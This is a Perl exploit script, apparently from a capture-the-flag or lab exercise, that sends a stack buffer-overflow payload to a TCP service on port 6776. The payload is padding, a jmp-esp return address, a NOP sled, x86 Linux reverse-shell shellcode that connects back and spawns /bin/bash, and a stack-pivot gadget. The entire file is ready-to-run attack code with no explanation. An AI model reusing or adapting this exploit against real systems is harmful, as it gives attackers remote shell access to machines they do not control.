#!/usr/bin/perl

use strict;
use IO::Socket::INET;

my $sock = IO::Socket::INET->new(
#    PeerAddr => '23.23.190.205',
    PeerAddr => '127.0.0.1',
    PeerPort => '6776',
    Proto    => 'tcp');

die "Can't connect : $!\n" unless $sock;

my $sc = "\x6a\x06\x6a\x01\x6a\x02\x31\xdb\x31\xc0\x89\xe1\xb3\x01\xb0\x66" .
         "\xcd\x80\x89\xc6\xb8\x80\xff\xff\xfe\xf7\xd0\x50\x66\xb8\xef\xff" . 
         "\x66\xf7\xd0\x66\x50\x66\x6a\x02\x89\xe0\x6a\x10\x50\x56\x89\xe1" .
         "\x31\xdb\xb3\x03\x31\xc0\xb0\x66\xcd\x80\x31\xc9\x89\xf3\x31\xc0" .
         "\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f" .
         "\xcd\x80\x31\xc0\x50\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69" .
         "\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";

my $payload = ':' . 'A'x75;              # PADDING
$payload .= pack('L', 0x08048817);       # jmp esp ; pop ebp; ret
$payload .= "\x90"x(220-75-length($sc)); # NOP's
$payload .= $sc;                         # Shellcode
$payload .= pack('L', 0x0804898a);       # add esp, 0x100; pop ebx, pop edi; pop ebp; ret

print $sock $payload;
